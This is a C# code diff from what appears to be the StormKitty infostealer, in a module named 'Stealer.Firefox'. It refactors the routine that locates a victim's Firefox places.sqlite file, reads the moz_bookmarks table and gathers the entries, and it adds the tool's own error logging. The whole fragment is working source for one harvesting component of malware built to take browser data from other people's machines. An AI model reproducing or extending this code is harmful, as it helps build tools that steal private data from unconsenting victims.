@@ -18,7 +18,7 @@ namespace Stealer.Firefox
                         if (File.Exists(sDir + "\\places.sqlite"))
                             return sDir + "\\places.sqlite";
             }
-            catch { }
+            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> Failed to find bookmarks\n" + ex); }
             return null;
         }
 
@@ -29,21 +29,9 @@ namespace Stealer.Firefox
             try
             {
                 string sCookiePath = GetBookmarksDBPath(path);
-
-                if (!File.Exists(sCookiePath))
-                    return scBookmark;
-
-                string sNewPath = Path.GetTempPath() + "\\places.raw";
-
-                if (File.Exists(sNewPath))
-                    File.Delete(sNewPath);
-
-                File.Copy(sCookiePath, sNewPath);
-                SQLite sSQLite = new SQLite(sNewPath);
-                sSQLite.ReadTable("moz_bookmarks");
-
-                if (sSQLite.GetRowCount() == 65536)
-                    return new List<Bookmark>();
+                // Read data from table
+                SQLite sSQLite = SqlReader.ReadTable(sCookiePath, "moz_bookmarks");
+                if (sSQLite == null) return scBookmark;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
@@ -58,11 +46,9 @@ namespace Stealer.Firefox
                         scBookmark.Add(bBookmark);
                     }
                 }
-
-                return scBookmark;
             }
-            catch (Exception ex) { Console.WriteLine(ex); }
-            return new List<Bookmark>();
+            catch (Exception ex) { StormKitty.Logging.Log("Firefox >> bookmarks collection failed\n" + ex); }
+            return scBookmark;
         }
 
     }
